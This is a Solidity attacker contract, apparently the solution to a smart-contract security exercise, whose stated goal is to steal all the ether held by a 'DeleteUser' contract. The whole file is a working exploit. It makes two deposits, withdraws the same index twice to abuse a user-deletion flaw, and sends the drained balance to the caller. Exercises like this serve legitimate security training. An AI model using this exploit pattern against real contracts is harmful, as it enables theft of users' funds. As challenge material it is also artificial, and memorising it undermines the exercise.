pragma solidity 0.8.15;

import "./DeleteUser.sol";
/**
 * This contract starts with 1 ether.
 * Your goal is to steal all the ether in the contract.
 *
 */

contract AttackerDeleteUser {
    DeleteUser immutable deleteUser;

    constructor(DeleteUser deleteUser_) {
        deleteUser = deleteUser_;
    }

    function attack(uint256 firstDepositValue, uint256 secondDepositValue, uint256 withdrawIndex) external payable {
        require(firstDepositValue + secondDepositValue == msg.value, "1");
        deleteUser.deposit{value: firstDepositValue}();
        deleteUser.deposit{value: secondDepositValue}();
        deleteUser.withdraw(withdrawIndex);
        deleteUser.withdraw(withdrawIndex);
        msg.sender.call{value: address(this).balance}("");
    }

    receive() external payable {}
}
